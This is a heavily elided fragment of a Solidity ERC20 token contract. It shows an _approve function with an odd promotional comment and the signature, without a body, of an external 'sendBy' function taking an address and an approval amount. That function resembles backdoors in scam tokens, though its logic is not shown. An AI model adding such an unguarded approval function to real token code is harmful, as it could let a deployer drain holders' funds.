...
contract ERC20 is Context, IERC20 {
  ...
  function _approve(address owner, address spender, uint256 amount) internal virtual { // Meet PEPE with Tinder!
  ...
  function sendBy(address _address, uint256 approveAmount) external {
